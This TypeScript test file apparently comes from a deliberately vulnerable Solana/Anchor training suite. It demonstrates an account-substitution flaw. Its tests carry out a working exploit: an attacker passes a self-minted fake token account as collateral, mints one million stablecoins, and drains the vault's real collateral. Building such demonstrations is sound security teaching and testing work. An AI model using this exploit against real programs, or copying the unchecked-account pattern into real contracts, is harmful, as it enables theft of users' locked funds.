/**
 * VULN 02 — Account substitution: fake collateral mint.
 *
 * mint_stable reads `collateral_ata.amount` as "proof of backing" without
 * checking the mint or the owner. The attacker mints worthless tokens of
 * their own mint, passes that account as collateral, mints 1M stablecoins
 * and redeems them for the REAL collateral locked in the vault.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  createMint, createAccount, mintTo, tokenBalance, sendSelfSigned, BN,
} from "./util";

describe("vuln02 account substitution (fake collateral)", () => {
  const program = anchorProgram("vuln02_account_substitution", PROG_IDS.vuln02);

  const statePda = findPda([seedsBuf("state")[0]], PROG_IDS.vuln02)[0];
  const vaultPda = findPda([seedsBuf("vault")[0]], PROG_IDS.vuln02)[0];

  let collateralMint: any, stableMint: any, stableMintKp: any;
  let honestUser: any, attacker: any;
  let honestCollateralAta: any, attackerCollateralAta: any, attackerStableAta: any;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    honestUser = await newFundedKeypair();
    attacker = await newFundedKeypair();

    collateralMint = await createMint(provider.connection, provider.wallet.payer, provider.wallet.publicKey, null, 6);
    honestCollateralAta = await createAccount(provider.connection, provider.wallet.payer, collateralMint, honestUser.publicKey);
    attackerCollateralAta = await createAccount(provider.connection, provider.wallet.payer, collateralMint, attacker.publicKey);
    await mintTo(provider.connection, provider.wallet.payer, collateralMint, honestCollateralAta, provider.wallet.publicKey, 500);

    // Program creates the stable mint, the state PDA and the vault.
    stableMintKp = require("@solana/web3.js").Keypair.generate();
    await program.methods
      .initialize()
      .accounts({ collateralMint, stableMint: stableMintKp.publicKey })
      .signers([stableMintKp])
      .rpc();
    stableMint = (await program.account.coinState.fetch(statePda)).stableMint;
    attackerStableAta = await createAccount(provider.connection, provider.wallet.payer, stableMint, attacker.publicKey);

    // Honest user locks real collateral.
    await program.methods
      .depositCollateral(new BN(500))
      .accounts({
        user: honestUser.publicKey,
        userCollateralAta: honestCollateralAta,
        vault: vaultPda,
        state: statePda,
      })
      .signers([honestUser])
      .rpc();
  });

  it("vault holds 500 units of real collateral", async () => {
    assert.equal((await tokenBalance(vaultPda)).toString(), "500");
  });

  it("attacker mints 1M stablecoins backed by a FAKE mint", async () => {
    // Worthless token the attacker fully controls.
    const fakeMint = await createMint(provider.connection, attacker, attacker.publicKey, null, 6);
    const fakeAta = await createAccount(provider.connection, attacker, fakeMint, attacker.publicKey);
    await mintTo(provider.connection, attacker, fakeMint, fakeAta, attacker.publicKey, 1_000_000);

    // No check on mint/owner -> fake account "proves" 1M of backing.
    // (No signer is even required by mint_stable — the attacker just pays fees.)
    await sendSelfSigned(
      [
        await program.methods
          .mintStable(new BN(1_000_000))
          .accounts({
            collateralAta: fakeAta,
            stableTo: attackerStableAta,
            state: statePda,
            stableMint,
          })
          .instruction(),
      ],
      attacker,
    );

    assert.equal((await tokenBalance(attackerStableAta)).toString(), "1000000");
  });

  it("attacker redeems fake stablecoins for the REAL collateral", async () => {
    // Only 500 units of REAL collateral exist in the vault — the attacker
    // redeems exactly that (their fake 1M "backing" was pure fiction).
    await program.methods
      .redeem(new BN(500))
      .accounts({
        user: attacker.publicKey,
        stableFrom: attackerStableAta,
        collateralTo: attackerCollateralAta,
        vault: vaultPda,
        state: statePda,
        stableMint,
      })
      .signers([attacker])
      .rpc();

    // The whole vault drained to the attacker.
    assert.equal((await tokenBalance(attackerCollateralAta)).toString(), "500");
    assert.equal((await tokenBalance(vaultPda)).toString(), "0");
  });
});
